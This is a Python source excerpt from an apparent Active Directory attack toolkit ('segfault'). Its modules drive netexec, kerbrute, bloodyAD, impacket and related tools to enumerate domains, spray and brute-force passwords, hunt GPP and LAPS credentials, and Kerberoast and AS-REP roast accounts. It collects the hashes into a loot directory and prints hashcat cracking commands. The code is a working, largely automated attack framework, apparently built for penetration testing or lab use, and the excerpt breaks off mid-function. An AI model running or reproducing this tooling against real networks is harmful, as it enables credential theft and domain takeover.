    """Set KRB5CCNAME and write env file so user can source it in shell."""
    os.environ['KRB5CCNAME'] = ccache_path
    env_file = os.path.join(os.path.dirname(ccache_path), 'krb5.env')
    try:
        open(env_file,'w').write(f'export KRB5CCNAME={ccache_path}\n')
        log(f'{GREY}KRB5CCNAME set — to use in shell: {WHITE}source {env_file}{RESET}','info')
    except Exception: pass

# ── auto-load target config from ~/.segfault_target ──────────────────────────
def _load_target_config(target):
    cfg_path = os.path.expanduser('~/.segfault_target')
    if not os.path.exists(cfg_path): return
    import configparser as _cp
    cfg = _cp.ConfigParser()
    cfg.read(cfg_path)
    sec = cfg['target'] if 'target' in cfg else {}
    if sec.get('domain'):   target.domain   = sec['domain'].strip()
    if sec.get('dc'):       target.dc       = sec['dc'].strip()
    if sec.get('dc_fqdn'): target.dc_fqdn  = sec['dc_fqdn'].strip()
    if sec.get('username'): target.user     = sec['username'].strip()
    if sec.get('password'): target.password = sec['password'].strip()
    if sec.get('hash'):     target.hash     = sec['hash'].strip()
    if sec.get('loot_dir'): target.loot_dir = sec['loot_dir'].strip()
    # load API key if set
    api_key = sec.get('anthropic_api_key','').strip()
    if api_key and not os.environ.get('ANTHROPIC_API_KEY'):
        os.environ['ANTHROPIC_API_KEY'] = api_key
    if target.domain and target.dc:
        log(f'{GREY}Auto-loaded target from ~/.segfault_target{RESET}','info')

_load_target_config(TARGET)

# auto-load ccache from loot dir on startup
def _auto_load_ccache(target):
    if os.environ.get('KRB5CCNAME'): return  # already set in shell
    loot = target.loot_dir
    if not os.path.isdir(loot): return
    import glob as _gl
    ccaches = _gl.glob(os.path.join(loot, '*.ccache'))
    if not ccaches: return
    # prefer ccache matching current user
    user_cc = os.path.join(loot, f'{target.user}.ccache') if target.user else None
    if user_cc and os.path.exists(user_cc):
        os.environ['KRB5CCNAME'] = user_cc
        return
    # fallback to most recent ccache
    ccaches.sort(key=os.path.getmtime, reverse=True)
    os.environ['KRB5CCNAME'] = ccaches[0]

_auto_load_ccache(TARGET)

# =============================================================================
# MODULE BASE
# =============================================================================
class Module:
    name='base'; description=''; category='misc'

    # modules that should never prompt "run again?" — always re-run
    _NO_CACHE = {'exec','bloody','cleanup','set','ws','flag','report','bh-view',
                 'loot','db','hint','explain','autopwn','pathpwn','b64get'}
    # modules that always prompt (destructive/long) — show extra warning
    _WARN_RERUN = {'dcsync','secretsdump','zerologon','nopac','backupabuse','adcskiller'}

    def run(self, target): raise NotImplementedError

    def ask(self, label, default=None, options=None):
        if hasattr(self,'answers') and label in self.answers:
            val = self.answers[label]
            log(f'{GREY}auto: {label} = {val}{RESET}','info')
            return val or default or ''
        return input_field(label, default, options)

    def req(self, target):
        if not target.is_set(): log('Set target first -- run: set', 'error'); return False
        return True

    def req_creds(self, target):
        """Require target + credentials (user + password or hash)."""
        if not self.req(target): return False
        if not target.user:
            log('Username required — run: set', 'error'); return False
        if not target.password and not target.hash:
            log('Password or hash required — run: set', 'error'); return False
        return True

    def need(self, *tools):
        t = check_tool(*tools)
        if not t: log(f'Tool not found: {WHITE}{" / ".join(tools)}{RESET}', 'error')
        return t

    def check_cache(self, target):
        """Check if this module was already run this session. Returns True if OK to proceed."""
        if self.name in self._NO_CACHE:
            return True
        ws = os.path.basename(os.path.dirname(target.loot_dir)) if target.loot_dir else ''
        cache_key = f'{ws}:{self.name}'
        if cache_key in _MODULE_RUN_CACHE:
            last = _MODULE_RUN_CACHE[cache_key]
            result = last.get('result','')
            ts     = last.get('time','')
            warn   = self.name in self._WARN_RERUN
            col    = ORANGE if warn else GREY
            print()
            log(f'{col}Already ran {WHITE}{self.name}{col} this session{RESET}  '
                f'{GREY}({ts}){RESET}','info')
            if result:
                log(f'  Result: {WHITE}{result}{RESET}','info')
            if warn:
                log(f'{ORANGE}This module makes changes — re-running may cause issues{RESET}','warn')
            ans = input_field('run again?','n').lower()
            if ans not in ('y','yes'):
                log(f'{GREY}Using cached result — skipped{RESET}','info')
                return False
        return True

    def mark_done(self, target, result=''):
        """Mark this module as completed in the session cache."""
        if self.name in self._NO_CACHE: return
        ws = os.path.basename(os.path.dirname(target.loot_dir)) if target.loot_dir else ''
        cache_key = f'{ws}:{self.name}'
        _MODULE_RUN_CACHE[cache_key] = {
            'result': result,
            'time':   datetime.now().strftime('%H:%M:%S'),
        }


# =============================================================================
# RECON
# =============================================================================
class Enum(Module):
    name='enum'; description='netexec -- users, groups, shares, policy, SPNs, loggedon, rid-brute'; category='recon'
    def run(self, target):
        if not self.req(target): return
        nxc = self.need('netexec','nxc','crackmapexec','cme')
        if not nxc: return
        hr()
        scope = self.ask('scope','all',['all','users','groups','shares','policy','loggedon','rid-brute'])
        hr()
        base = [nxc, 'smb'] + target.nxc_args()

        # probe which flags this netexec version supports
        import subprocess as _sp  # version probe
        smb_flags = {'users':['--users'],'shares':['--shares'],
                     'policy':['--pass-pol'],'loggedon':['--loggedon-users'],'rid-brute':['--rid-brute']}
        ldap_flags = {'groups':['--groups'],'spns':['--trusted-for-delegation']}
        flags_map  = smb_flags

        # check impacket compatibility — if netexec crashes on smb, fall back to ldap protocol
        test = subprocess.run(base + ['--users'], capture_output=True, text=True)
        smb_broken = 'regsecrets' in (test.stdout + test.stderr) or 'ModuleNotFoundError' in (test.stdout + test.stderr)
        if smb_broken:
            log(f'{RED}netexec SMB broken — impacket version conflict{RESET}', 'error')
            log(f'Fix: {WHITE}sudo apt reinstall netexec -y && pip uninstall impacket -y && sudo apt install python3-impacket -y{RESET}', 'info')
            log(f'Falling back to LDAP protocol for what it supports...', 'warn')
            base = [nxc, 'ldap'] + target.nxc_args()
            flags_map = {'users':['--users'],'groups':['--groups'],'rid-brute':['--rid-brute']}

        ldap_base = [nxc, 'ldap'] + target.nxc_args()
        all_lines = []
        lock = threading.Lock()

        def _run_enum(label, cmd):
            log(f'Enumerating {label}...', 'info')
            try:
                _, lines = run_cmd_capture(cmd)
                with lock:
                    all_lines.extend(lines)
            except Exception as _e:
                _logfile(f'enum {label} error: {_e}','error')

        if scope == 'all':
            tasks = []
            for k,f in smb_flags.items():
                if smb_broken and k not in ('users','rid-brute'): continue
                tasks.append((k, base + f))
            for k,f in ldap_flags.items():
                tasks.append((f'{k} (ldap)', ldap_base + f))
            log(f'Running {len(tasks)} enum tasks in parallel...','info')
            with ThreadPoolExecutor(max_workers=min(len(tasks),4)) as pool:
                futures = {pool.submit(_run_enum, label, cmd): label for label,cmd in tasks}
                for fut in as_completed(futures):
                    try: fut.result()
                    except Exception as e: log(f'enum {futures[fut]} failed: {e}','warn')
        else:
            if scope in ldap_flags:
                _, lines = run_cmd_capture(ldap_base + ldap_flags[scope])
            else:
                _, lines = run_cmd_capture(base + smb_flags.get(scope, []))
            all_lines.extend(lines)
        # parse and save usernames automatically
        users = _parse_usernames(all_lines, target.domain)
        if users:
            _save_users(users, target.loot_dir, target.domain)
            log(f'Userlist: {WHITE}{os.path.join(target.loot_dir, "users.txt")}{RESET} — use for kerbrute/spray/asreproast','info')
            add_result('enum', f'{len(users)} users → users.txt')
        # scan all output for passwords in descriptions
        _scan_descriptions(all_lines, target.loot_dir, target.domain or '')

        # ── smart auto-suggest based on results ──────────────────────────────
        suggestions = []
        enum_str = '\n'.join(all_lines)
        # no creds yet → suggest unauthenticated attacks
        if not target.user:
            if users:
                suggestions.append(('asreproast', f'{len(users)} users found — check for AS-REP roastable'))
                suggestions.append(('kerbrute',   'enumerate valid users / password spray'))
        # have creds → suggest next steps
        else:
            if 'SPN' in enum_str or 'servicePrincipalName' in enum_str:
                suggestions.append(('kerberoast', 'SPNs found — roast service tickets'))
            if 'LAPS' in enum_str or 'ms-Mcs-AdmPwd' in enum_str:
                suggestions.append(('laps', 'LAPS attribute found — read local admin password'))
            if 'WinRM' in enum_str or '5985' in enum_str:
                suggestions.append(('exec', 'WinRM open — try shell'))
            if users:
                suggestions.append(('adrecon', 'collect BloodHound data'))
                suggestions.append(('aclscan', 'instant ACL vulnerability scan'))
        # shares found → spider
        if 'READ' in enum_str or 'WRITE' in enum_str:
            suggestions.append(('shares', 'readable share(s) found — spider for sensitive files'))
            suggestions.append(('snaffler', 'find sensitive files across shares'))

        if suggestions:
            print()
            log(f'{C0}Suggested next steps:{RESET}','info')
            for i, (mod, reason) in enumerate(suggestions[:4], 1):
                print(f'  {GREY}{i}.{RESET} {C0}{mod:<16}{RESET} {GREY}{reason}{RESET}')
            print()
            ans = input_field('run a suggestion? (number or module name, enter to skip)','')
            if ans.strip():
                # resolve number or module name
                chosen = None
                if ans.strip().isdigit():
                    idx = int(ans.strip()) - 1
                    if 0 <= idx < len(suggestions):
                        chosen = suggestions[idx][0]
                elif ans.strip().lower() in MODULES:
                    chosen = ans.strip().lower()
                if chosen and chosen in MODULES:
                    log(f'Running {C0}{chosen}{RESET}...','info')
                    try: MODULES[chosen]().run(target)
                    except Exception as _e: log(f'Error: {_e}','error')
        hr()

class LDAPEnum(Module):
    name='ldapenum'; description='LDAP enumeration -- ldeep / ldapdomaindump / ldapsearch'; category='recon'
    def run(self, target):
        if not self.req(target): return
        hr()
        tool = self.ask('tool','ldeep',['ldeep','ldapdomaindump','ldapsearch','group'])
        hr()
        if tool == 'group':
            # quick group member lookup via netexec
            nxc = self.need('netexec','nxc','crackmapexec','cme')
            if not nxc: return
            grp  = self.ask('group name')
            ccache = os.environ.get('KRB5CCNAME','')
            dc   = target.dc_fqdn or target.dc
            base = [nxc,'ldap',dc]
            if ccache and os.path.exists(ccache):
                base += ['-k','--use-kcache','-u',target.user]
            else:
                base += ['-u',target.user]
                if target.password: base += ['-p',target.password]
                elif target.hash:   base += ['-H',target.hash]
            run_cmd(base+['--group',grp], label=f'nxc group {grp}')
            hr(); return
        if tool == 'ldeep':
            t = self.need('ldeep')
            if not t: return
            out = os.path.join(target.loot_dir,'ldeep'); os.makedirs(out, exist_ok=True)
            ccache  = os.environ.get('KRB5CCNAME','')
            use_krb = ccache and os.path.exists(ccache)
            krb_host = target.dc_fqdn if target.dc_fqdn else f'dc01.{target.domain}'
            if use_krb:
                log(f'{GREEN}Using Kerberos ccache for ldeep{RESET}','info')
                auth = ['-d', target.domain, '-u', target.user,
                        '-s', f'ldap://{krb_host}', '-k']
            else:
                auth = ['-d', target.domain, '-u', target.user, '-s', f'ldap://{target.dc}']
                if target.password: auth += ['-p', target.password]
                elif target.hash:   auth += ['-p', f':{target.hash}', '--ntlm']

            # test ldeep first with a single query
            test = subprocess.run([t,'ldap']+auth+['users'], capture_output=True, text=True)
            ldeep_ok = 'GSSError' not in (test.stderr or '') and 'Server not found' not in (test.stderr or '')

            if ldeep_ok:
                for q in ['users','groups','computers','gpo','ou','pso','trusts','subnets']:
                    log(f'ldeep {q}', 'info'); run_cmd([t,'ldap']+auth+[q])
                log(f'Output: {WHITE}{out}{RESET}', 'success')
            else:
                log(f'{ORANGE}ldeep Kerberos auth failed — falling back to netexec{RESET}','warn')
                nxc = check_tool('netexec','nxc','crackmapexec','cme')
                if not nxc: log('netexec not found','error'); hr(); return
                dc = krb_host if use_krb else target.dc
                base = [nxc,'ldap',dc]
                if use_krb: base += ['-k','--use-kcache','-u',target.user]
                else:
                    base += ['-u',target.user]
                    if target.password: base += ['-p',target.password]
                    elif target.hash:   base += ['-H',target.hash]
                for flag,label in [('--users','users'),('--groups','groups'),
                                   ('--computers','computers'),('--trusted-for-delegation','delegation')]:
                    log(f'nxc ldap {label}','info')
                    rc, lines = run_cmd_capture(base+[flag], label=f'nxc {label}')
                    out_f = os.path.join(out, f'{label}.txt')
                    with open(out_f,'w') as _f: _f.write('\n'.join(lines))
                users = _parse_usernames('\n'.join(open(os.path.join(out,'users.txt')).read().splitlines()
                    if os.path.exists(os.path.join(out,'users.txt')) else []), target.domain)
                if users: _save_users(users, target.loot_dir, target.domain)
                log(f'Output: {WHITE}{out}{RESET}', 'success')
        elif tool == 'ldapdomaindump':
            t = self.need('ldapdomaindump')
            if not t: return
            out = os.path.join(target.loot_dir,'ldapdump'); os.makedirs(out, exist_ok=True)
            run_cmd([t,'-u',f'{target.domain}\\{target.user}:{target.password or ""}',
                     f'ldap://{target.dc}','-o',out], label='ldapdomaindump')
        elif tool == 'ldapsearch':
            t = self.need('ldapsearch')
            if not t: return
            dc_str = ','.join([f'DC={p}' for p in target.domain.split('.')])
            queries = {'users':'(objectClass=user)','computers':'(objectClass=computer)',
                       'groups':'(objectClass=group)','spns':'(servicePrincipalName=*)',
                       'asrep':'(userAccountControl:1.2.840.113556.1.4.803:=4194304)','admins':'(adminCount=1)'}
            q = self.ask('query','users',list(queries.keys()))
            run_cmd([t,'-x','-H',f'ldap://{target.dc}','-D',f'{target.user}@{target.domain}',
                     '-w',target.password or '','-b',dc_str,queries.get(q,'(objectClass=user)')], label=f'ldapsearch {q}')
        hr()

class BloodyEnum(Module):
    name='bloodyenum'; description='bloodyAD -- enum users, groups, computers, trusts, DNS, delegations'; category='recon'
    def run(self, target):
        if not self.req(target): return
        t = self.need('bloodyad','bloodyAD')
        if not t: return
        hr()
        query = self.ask('query','users',['users','groups','computers','trusts','dnsrecords','delegations','search','acl'])
        hr()
        base = [t] + target.bloodyad_args()
        dc_path = 'DC=' + ',DC='.join(target.domain.split('.'))
        cmds = {
            'users':      base + ['get','children',dc_path,'--attr','sAMAccountName,description,memberOf'],
            'groups':     base + ['get','children',dc_path,'--type','Group'],
            'computers':  base + ['get','children',dc_path,'--type','Computer'],
            'trusts':     base + ['get','trusts'],
            'dnsrecords': base + ['get','dnsDump'],
            'delegations':base + ['get','search','--filter','(msDS-AllowedToDelegateTo=*)','--attr','sAMAccountName,msDS-AllowedToDelegateTo'],
        }
        if query == 'search':
            attr = self.ask('attribute','description'); val = self.ask('contains','')
            filt = f'({attr}=*{val}*)' if val else f'({attr}=*)'
            run_cmd(base + ['get','search','--filter',filt], label='bloodyAD search')
        elif query == 'acl':
            mode = self.ask('mode','writable',['writable','object','owned'])
            if mode == 'writable':
                otype = self.ask('object type','ALL',['ALL','USER','GROUP','COMPUTER','OU','DOMAIN'])
                right = self.ask('right','WRITE',['WRITE','READ','CHILD'])
                log(f'Objects {WHITE}{target.user}{RESET} can {WHITE}{right}{RESET}:','info')
                _, lines = run_cmd_capture(base+['get','writable','--otype',otype,'--right',right],
                                           label='bloodyAD get writable')
                # parse and highlight interesting objects
                interesting = ['Domain','AdminSD','krbtgt','Domain Admin','Enterprise Admin']
                for l in lines:
                    color = ORANGE if any(x.lower() in l.lower() for x in interesting) else WHITE
                    if l.strip(): print(f'  {color}{l.strip()}{RESET}')
            elif mode == 'object':
                obj = self.ask('object (sAMAccountName or DN)')
                if not obj: hr(); return
                log(f'ACEs on {WHITE}{obj}{RESET}:','info')
                _, lines = run_cmd_capture(base+['get','object',obj,'--attr','nTSecurityDescriptor'],
                                           label='bloodyAD object ACEs')
                # decode common SID patterns
                for l in lines:
                    # highlight our user's SID entries
                    if target.user and target.user.lower() in l.lower():
                        print(f'  {GREEN}{l.strip()}{RESET}')
                    elif any(x in l for x in ['0xf01ff','GenericAll','FullControl']):
                        print(f'  {ORANGE}{l.strip()}{RESET}')
                    elif l.strip():
                        print(f'  {GREY}{l.strip()}{RESET}')
            elif mode == 'owned':
                log(f'Objects owned by {WHITE}{target.user}{RESET}:','info')
                run_cmd(base+['get','writable','--otype','ALL','--right','OWNER'],
                        label='bloodyAD owned objects')
        else:
            run_cmd(cmds.get(query, base+['get','children',dc_path]), label=f'bloodyAD {query}')
        hr()

class Kerbrute(Module):
    name='kerbrute'; description='kerbrute -- username enum, password spray, bruteforce via Kerberos'; category='recon'
    def run(self, target):
        if not target.dc: log('Set DC first','error'); return
        t = self.need('kerbrute')
        if not t: return
        hr()
        action = self.ask('action','userenum',['userenum','passwordspray','bruteuser','bruteforce'])
        hr()
        if action == 'userenum':
            wl  = self.ask('wordlist','/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt')
            out = os.path.join(target.loot_dir,'kerbrute_users.txt')
            run_cmd([t,'userenum','--dc',target.dc,'-d',target.domain,wl,'-o',out], label='kerbrute userenum')
        elif action == 'passwordspray':
            pw = self.ask('password',target.password or ''); ul = self.ask('user list','/tmp/users.txt')
            run_cmd([t,'passwordspray','--dc',target.dc,'-d',target.domain,ul,pw], label='kerbrute spray')
        elif action in ('bruteuser','bruteforce'):
            u  = self.ask('username',target.user or ''); pl = self.ask('passlist','/usr/share/wordlists/rockyou.txt')
            run_cmd([t,action,'--dc',target.dc,'-d',target.domain,pl,u], label=f'kerbrute {action}')
        hr()

class Enum4Linux(Module):
    name='enum4linux'; description='enum4linux-ng -- SMB/RPC/LDAP enumeration, null sessions, shares'; category='recon'
    def run(self, target):
        if not target.dc: log('Set DC first','error'); return
        t = self.need('enum4linux-ng','enum4linux')
        if not t: return
        hr()
        out = os.path.join(target.loot_dir,'enum4linux')
        cmd = [t,'-A',target.dc]
        if target.user:     cmd += ['-u',target.user]
        if target.password: cmd += ['-p',target.password]
        elif target.hash:   cmd += ['-H',target.hash]
        run_cmd(cmd + ['-oJ',out], label='enum4linux-ng')
        hr()

class RPCEnum(Module):
    name='rpcenum'; description='rpcclient -- users, groups, printers, shares, SIDs, password policy'; category='recon'
    def run(self, target):
        if not target.dc: log('Set DC first','error'); return
        t = self.need('rpcclient')
        if not t: return
        hr()
        auth = f'{target.user}%{target.password}' if target.password else f'%'
        queries = ['enumdomusers','enumdomgroups','enumprinters','querydominfo','getdompwinfo',
                   'enumalsgroups domain','lsaquery','lookupnames administrator','dsroledominfo']
        all_out = []
        for q in queries:
            log(f'{GREY}{q}{RESET}','info')
            rc, out, err = run_cmd_capture([t,'-U',auth,f'//{target.dc}','-c',q])
            all_out.extend(out.splitlines() if out else [])
            if out: print(out)
        # parse and save users
        import re as _re
        users = []
        for line in all_out:
            m = _re.search(r'user:\[([^\]]+)\]', line)
            if m:
                u = m.group(1).strip()
                if u and '$' not in u and u not in ('Guest','krbtgt','DefaultAccount'):
                    users.append(u)
        if users:
            ufile = os.path.join(target.loot_dir,'users.txt')
            with open(ufile,'w') as f: f.write('\n'.join(users)+'\n')
            log(f'{GREEN}{len(users)} users saved → {WHITE}{ufile}{RESET}','success')
            for u in users: print(f'  {C0}{u}{RESET}')
            add_result('rpcenum', f'{len(users)} users → users.txt')
        hr()

class GPPPassword(Module):
    name='gpp'; description='netexec -- hunt GPP passwords, autologon creds, and LAPS in SYSVOL'; category='recon'
    def run(self, target):
        if not self.req(target): return
        nxc = self.need('netexec','nxc','crackmapexec','cme')
        if not nxc: return
        hr()
        base = [nxc,'smb'] + target.nxc_args()
        run_cmd(base+['-M','gpp_password'],  label='GPP Passwords')
        run_cmd(base+['-M','gpp_autologin'], label='GPP Autologin')
        run_cmd(base+['-M','laps'],          label='LAPS')
        hr()

class ADRecon(Module):
    name='adrecon'; description='rusthound-ce (preferred) / bloodhound-python fallback -- BloodHound CE collection'; category='recon'

    def _swap_resolv(self, dc, domain):
        """Temporarily set DC as nameserver with TCP-only DNS. Returns original content."""
        resolv_orig = open('/etc/resolv.conf', errors='replace').read() if os.path.exists('/etc/resolv.conf') else ''
        resolv_tmp  = f'nameserver {dc}\nsearch {domain}\noptions use-vc timeout:5 attempts:2\n'
        try:
            subprocess.run(['sudo','-n','bash','-c',f'printf "{resolv_tmp}" > /etc/resolv.conf'],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception: pass
        return resolv_orig

    def _restore_resolv(self, original):
        """Restore original resolv.conf."""
        try:
            subprocess.run(['sudo','-n','bash','-c',f'echo {repr(original)} > /etc/resolv.conf'],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception: pass

    def run(self, target):
        if not self.req(target): return
        if not target.user: log('Username required','error'); return
        hr()
        out = os.path.join(target.loot_dir,'bloodhound'); os.makedirs(out, exist_ok=True)

        # prefer rusthound-ce — faster, no DNS issues, BloodHound CE format
        rh = check_tool('rusthound-ce','rusthound_ce')
        bh = check_tool('bloodhound-python','bloodhound')

        if not rh and not bh:
            log(f'No collection tool found','error')
            log(f'Install rusthound-ce: {WHITE}cargo install rusthound-ce{RESET}','info')
            log(f'Or bloodhound-python: {WHITE}pip install bloodhound --break-system-packages{RESET}','info')
            hr(); return

        col = self.ask('collection','All',['All','DCOnly','Group','LocalAdmin','Session','Trusts','Default','LoggedOn','ObjectProps'])
        hr()

        if rh:
            # rusthound-ce — no DNS resolution issues, speaks directly to LDAP
            log(f'{GREEN}Using rusthound-ce{RESET} — faster, BloodHound CE format, no DNS dependency','info')
            user_str = f'{target.user}@{target.domain}'
            cmd = [rh,'-d',target.domain,'-u',user_str,'-o',out,'-z',
                   '-i',target.dc,'--dns-tcp','-n',target.dc]
            # prefer ccache (Kerberos) over hash — rusthound-ce doesn't support NT hash auth
            ccache = os.environ.get('KRB5CCNAME','')
            loot_ccache = os.path.join(target.loot_dir, f'{target.user}.ccache')
            if not ccache and os.path.exists(loot_ccache):
                ccache = loot_ccache
                os.environ['KRB5CCNAME'] = ccache
            if ccache and os.path.exists(ccache):
                log(f'{GREEN}Using Kerberos ccache for rusthound-ce: {WHITE}{ccache}{RESET}','info')
                cmd += ['-k']
            elif target.password:
                cmd += ['-p',target.password]
            elif target.hash:
                cmd += ['-p',f':{target.hash}']
            if col.lower() == 'dconly': cmd += ['-c','DCOnly']
            if target.domain: cmd += ['-f',target.dc_fqdn or f'dc.{target.domain}']
            # capture output to detect LDAP signing error
            rc, lines = run_cmd_capture(cmd, label='rusthound-ce')
            full_out = '\n'.join(lines)
            ldap_err       = any('strongerAuthRequired' in l or 'rc=8' in l for l in lines)
            ntlm_disabled  = any('data 710' in l or 'data 52e' in l or 'invalidCredentials' in l for l in lines)
            skew_err       = any('KRB_AP_ERR_SKEW' in l or 'clock skew' in l.lower() for l in lines)

            if skew_err:
                log(f'{ORANGE}Kerberos clock skew — run {C0}clockskew sync{ORANGE} then retry{RESET}','warn')
            elif ntlm_disabled:
                log(f'{ORANGE}NTLM auth rejected — NTLM is disabled on this domain{RESET}','warn')
                log(f'Run {C0}tgt{RESET} first to get a Kerberos ticket, then retry {C0}adrecon{RESET}','info')
            elif ldap_err or rc != 0:
                log(f'{ORANGE}LDAP signing enforced — retrying with LDAPS (--ldaps){RESET}','warn')
                cmd_ssl = cmd + ['--ldaps']
                run_cmd(cmd_ssl, label='rusthound-ce LDAPS')

        else:
            # bloodhound-python fallback — needs DNS, temp resolv.conf swap
            log(f'{ORANGE}rusthound-ce not found — falling back to bloodhound-python{RESET}','warn')
            log(f'Install rusthound-ce: {WHITE}cargo install rusthound-ce{RESET}','info')
            dc_host = target.dc_fqdn or f'dc01.{target.domain}'
            cmd = [bh,'-d',target.domain,'-u',target.user,'-c',col,'--zip','-o',out,
                   '-dc',dc_host,'-ns',target.dc,'--dns-tcp','--disable-pooling','--disable-autogc']
            if target.password: cmd += ['-p',target.password]
            elif target.hash:   cmd += ['--hashes',f':{target.hash}']
            log(f'DNS temporarily set to {WHITE}{target.dc}{RESET} (TCP only) for collection','info')
            resolv_orig = self._swap_resolv(target.dc, target.domain)
            run_cmd(cmd, label='bloodhound-python')
            self._restore_resolv(resolv_orig)
            log('DNS restored to original','info')

        log(f'Output: {WHITE}{out}{RESET} — drag zip into BloodHound CE','success')
        # parse counts from rusthound output for results pane
        import re as _re
        all_lines = '\n'.join(lines) if 'lines' in dir() else ''
        _um = _re.search(r'(\d+) users parsed', all_lines)
        _cm = _re.search(r'(\d+) computers parsed', all_lines)
        _gm = _re.search(r'(\d+) groups parsed', all_lines)
        _counts = []
        if _um: _counts.append(f'{_um.group(1)}u')
        if _cm: _counts.append(f'{_cm.group(1)}c')
        if _gm: _counts.append(f'{_gm.group(1)}g')
        _summary = f'{" ".join(_counts)} ingested' if _counts else f'collection complete'
        add_result('adrecon', _summary)
        hr()

class ADIDNSDump(Module):
    name='dnsdump'; description='adidnsdump -- dump all DNS records from Active Directory'; category='recon'
    def run(self, target):
        if not self.req(target): return
        t = self.need('adidnsdump')
        if not t: return
        hr()
        out = os.path.join(target.loot_dir,'dns_records.csv')
        cmd = [t,'-u',f'{target.domain}\\{target.user}',target.dc,'--print-zones','-r','-o',out]
        if target.password: cmd += ['-p',target.password]
        run_cmd(cmd, label='adidnsdump')
        log(f'DNS records: {WHITE}{out}{RESET}','success')
        hr()

# =============================================================================
# CREDENTIALS
# =============================================================================
class Kerberoast(Module):
    name='kerberoast'; description='GetUserSPNs -- roast SPNs -> hashcat -m 13100/19600/19700'; category='credentials'
    def run(self, target):
        if not self.req(target): return
        t = self.need('impacket-GetUserSPNs','GetUserSPNs.py')
        if not t: return
        hr()
        no_preauth = self.ask('no-preauth user for AS-REP Kerberoast (blank = skip)','')
        uf  = self.ask('user list (blank = all SPN users)',os.path.join(target.loot_dir,'users.txt') if os.path.exists(os.path.join(target.loot_dir,'users.txt')) else '')
        out = os.path.join(target.loot_dir,'kerberoast_hashes.txt')

        if no_preauth:
            # AS-REP Kerberoast: use no-preauth account to kerberoast without knowing passwords
            log(f'AS-REP Kerberoasting with no-preauth user {WHITE}{no_preauth}{RESET}','info')
            cmd = [t,'-no-preauth',no_preauth,'-dc-host',target.dc_fqdn or target.dc,
                   f'{target.domain}/']
            if uf and os.path.isfile(uf): cmd += ['-usersfile',uf]
            cmd += ['-outputfile',out]
        elif target.password and not os.environ.get('KRB5CCNAME'):
            auth = f'{target.domain}/{target.user}:{target.password}'
            cmd  = [t,auth,'-dc-ip',target.dc,'-outputfile',out,'-request']
        elif target.password and os.environ.get('KRB5CCNAME'):
            # prefer Kerberos when ccache available (NTLM-disabled environments)
            auth = f'{target.domain}/{target.user}'
            cmd  = [t,auth,'-dc-ip',target.dc,'-outputfile',out,'-request','-k','-no-pass',
                    '-dc-host',target.dc_fqdn or target.dc]
        elif target.hash:
            auth = f'{target.domain}/{target.user}'
            cmd  = [t,auth,'-dc-ip',target.dc,'-outputfile',out,'-request','-hashes',f':{target.hash}']
        else:
            cmd  = [t,f'{target.domain}/{target.user}','-dc-ip',target.dc,'-outputfile',out,'-request','-no-pass']

        if not no_preauth and uf and os.path.isfile(uf):
            cmd += ['-usersfile',uf]
        elif not no_preauth and uf and not os.path.isfile(uf):
            cmd += ['-request-user',uf]

        run_cmd(faketime_wrap(cmd, target.skew), label='GetUserSPNs')
        if os.path.exists(out):
            hs = [l for l in open(out, errors='replace').read().splitlines() if '$krb5tgs$' in l]
            if hs:
                log(f'{len(hs)} TGS hash(es): {WHITE}{out}{RESET}','success'); add_result('kerberoast', f'{len(hs)} TGS hash(es)')
                for h in hs: print(f'  {PINK}{h[:100]}{"..." if len(h)>100 else ""}{RESET}')
                hr()
                print(f'  {WHITE}hashcat -m 13100 {out} rockyou.txt{RESET}  {GREY}# RC4{RESET}')
                print(f'  {WHITE}hashcat -m 19600 {out} rockyou.txt{RESET}  {GREY}# AES128{RESET}')
                print(f'  {WHITE}hashcat -m 19700 {out} rockyou.txt{RESET}  {GREY}# AES256{RESET}')
        hr()

class ASREPRoast(Module):
    name='asreproast'; description='GetNPUsers -- roast preauth-disabled accounts -> hashcat -m 18200'; category='credentials'
    def run(self, target):
        if not self.req(target): return
        t = self.need('impacket-GetNPUsers','GetNPUsers.py')
        if not t: return
        hr()
        default_ul = os.path.join(target.loot_dir,'users.txt') if os.path.exists(os.path.join(target.loot_dir,'users.txt')) else ''
        ufile = self.ask('user list (blank = auth enum)', default_ul)
        out   = os.path.join(target.loot_dir,'asreproast_hashes.txt')
        if ufile and os.path.isfile(ufile):
            # unauthenticated with user list
            cmd = [t,f'{target.domain}/','-dc-ip',target.dc,'-format','hashcat',
                   '-outputfile',out,'-no-pass','-usersfile',ufile]
        elif target.user and (target.password or target.hash):
            # authenticated enum — use Kerberos ccache when available (NTLM-disabled envs)
            ccache = os.environ.get('KRB5CCNAME','')
            if ccache and os.path.exists(ccache):
                auth = f'{target.domain}/{target.user}'
                cmd = [t,auth,'-dc-ip',target.dc,'-format','hashcat','-outputfile',out,
                       '-request','-k','-no-pass','-dc-host',target.dc_fqdn or target.dc]
            elif target.password:
                auth = f'{target.domain}/{target.user}:{target.password}'
                cmd = [t,auth,'-dc-ip',target.dc,'-format','hashcat','-outputfile',out,'-request']
            else:
                auth = f'{target.domain}/{target.user}'
                cmd = [t,auth,'-dc-ip',target.dc,'-format','hashcat','-outputfile',out,
                       '-request','-hashes',f':{target.hash}']
        elif target.user:
            # user set but no password — no-pass mode
            cmd = [t,f'{target.domain}/{target.user}','-dc-ip',target.dc,
                   '-format','hashcat','-outputfile',out,'-request','-no-pass']
        else:
            # no user set — try unauthenticated enum (DC may return all preauth-disabled users)
            log(f'{GREY}No user set — trying unauthenticated AS-REP roast{RESET}','info')
            cmd = [t,f'{target.domain}/','-dc-ip',target.dc,'-format','hashcat',
                   '-outputfile',out,'-no-pass','-request']
        run_cmd(faketime_wrap(cmd, target.skew), label='GetNPUsers')

        # also extract hashes from kerbrute output (multi-line format)
        kb_users = os.path.join(target.loot_dir,'kerbrute_users.txt')
        if os.path.exists(kb_users):
            raw = open(kb_users, errors='replace').read()
            # kerbrute wraps hashes across lines — join continuation lines
            joined = re.sub(r'\n\s+', '', raw)
            kb_hashes = re.findall(r'(\$krb5asrep\$\d+\$[^\s]+)', joined)
            if kb_hashes:
                existing = open(out, errors='replace').read() if os.path.exists(out) else ''
                new_hashes = [h for h in kb_hashes if h not in existing]
                if new_hashes:
                    with open(out,'a') as _f: _f.write('\n'.join(new_hashes)+'\n')
                    log(f'{GREEN}Extracted {len(new_hashes)} hash(es) from kerbrute output{RESET}','success')

        if os.path.exists(out):
            hs = [l for l in open(out, errors='replace').read().splitlines() if '$krb5asrep$' in l]
            if hs:
